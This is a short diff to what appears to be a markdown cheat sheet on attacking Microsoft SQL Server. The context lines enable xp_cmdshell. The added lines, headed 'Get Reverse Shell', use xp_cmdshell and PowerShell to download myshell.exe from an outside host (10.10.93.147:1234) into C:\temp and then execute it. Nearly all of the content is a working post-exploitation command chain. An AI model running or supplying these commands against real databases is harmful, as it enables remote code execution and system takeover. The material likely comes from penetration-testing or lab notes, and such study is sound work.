@@ -24,4 +24,8 @@ sp_configure 'show advanced options', 1
 RECONFIGURE
 sp_configure 'xp_cmdshell', 1
 RECONFIGURE
+
+#Get Reverse Shell.
+xp_cmdshell powershell.exe iwr -uri http://10.10.93.147:1234/myshell.exe -Outfile C:\temp\myshell.exe
+xp_cmdshell C:\temp\myshell.exe
 ```
